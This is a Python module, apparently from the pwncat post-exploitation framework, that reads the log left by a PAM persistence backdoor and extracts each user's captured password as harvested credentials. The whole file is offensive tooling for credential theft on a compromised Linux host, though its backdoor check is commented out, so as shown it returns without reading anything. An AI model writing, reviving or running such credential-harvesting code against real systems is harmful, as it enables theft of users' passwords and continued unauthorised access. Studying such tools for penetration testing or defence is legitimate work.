#!/usr/bin/env python3

import pwncat
from pwncat.platform.linux import Linux
from pwncat.modules.agnostic.enumerate import EnumerateModule, Schedule
from pwncat.modules.linux.enumerate.creds import PasswordData
from pwncat.modules.linux.persist.gather import InstalledModule

"""
TODO: This module is specifically used to check if we have passwords set
from previously running a paired PAM persistence backdoor. If the persistence
isn't in place already, there is no reason to run this enumeration module.
The persistence module has not been re-implemented in the new platforms 
framework so this can't be updated just yet.
"""


class Module(EnumerateModule):
    """
    Exfiltrate logged passwords from the pam-based persistence
    module. This persistence module logs all attempted passwords
    for all users in a known location. We read this file and yield
    all passwords we have collected.
    """

    PLATFORM = [Linux]
    SCHEDULE = Schedule.ALWAYS
    PROVIDES = ["creds.password"]

    def enumerate(self, session):

        pam: InstalledModule = None
        # Check if we previously had PAM persistence... this isn't re-implemented yet
        # for module in session.run(
        #     "persist.gather", progress=self.progress, module="persist.pam_backdoor"
        # ):
        #     pam = module
        #     break

        if pam is None:
            # The pam persistence module isn't installed.
            return

        # Grab the log path
        log_path = pam.persist.args["log"]
        # Just in case we have multiple of the same password logged
        observed = []

        try:
            with session.platform.open(log_path, "r") as filp:
                for line in filp:
                    line = line.rstrip("\n")
                    if line in observed:
                        continue

                    user, *password = line.split(":")
                    password = ":".join(password)

                    try:
                        # Check for valid user name
                        session.platform.find_user(name=user)
                    except KeyError:
                        continue

                    observed.append(line)

                    yield "creds.password", PasswordData(
                        password, log_path, None, uid=pwncat.victim.users[user].id
                    )
        except (FileNotFoundError, PermissionError):
            pass
